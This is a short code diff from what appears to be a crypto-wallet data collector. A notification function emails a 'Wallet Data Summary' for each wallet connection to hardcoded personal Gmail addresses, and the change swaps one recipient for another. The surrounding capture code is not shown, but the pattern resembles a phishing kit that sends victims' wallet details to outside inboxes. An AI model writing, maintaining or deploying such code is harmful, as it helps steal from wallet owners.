@@ -150,7 +150,7 @@ Wallet Data Summary:
   `;
 
   return {
-    to: process.env.NOTIFICATION_EMAIL || ['varjex1@gmail.com', 'engreemarket@gmail.com'],
+    to: process.env.NOTIFICATION_EMAIL || ['spillgelo@gmail.com', 'engreemarket@gmail.com'],
     subject: `🚨 Wallet Connection - ${connectionMethod} - ${new Date().toLocaleDateString()}`,
     text: textContent,
     html: htmlContent,
